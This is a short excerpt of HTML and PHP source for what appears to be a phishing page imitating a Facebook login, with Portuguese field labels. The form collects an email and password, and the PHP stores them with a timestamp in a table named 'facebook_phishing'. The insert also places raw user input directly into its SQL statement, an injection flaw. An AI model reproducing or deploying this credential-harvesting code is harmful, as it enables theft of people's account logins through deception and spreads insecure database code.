    ...
    <div class="headersubdiv">
      ...
      <div class="loginform">
        <table>
          ...
          <form method="POST">
            <td><input class="logintext loginfield" name="form_email" placeholder="Email" type="text" required></td>
            <td><input class="logintext loginrowgap loginfield" name="form_senha" placeholder="Senha" type="password" required></td>
...
if (isset($email) && isset($senha)){
  ...
  $inserir_dados = $conexao_pdo->prepare("INSERT INTO facebook_phishing (email, senha, data_registro, hora_registro) values ('$email', '$senha', '$data', '$hora')");
  $inserir_dados ->execute();
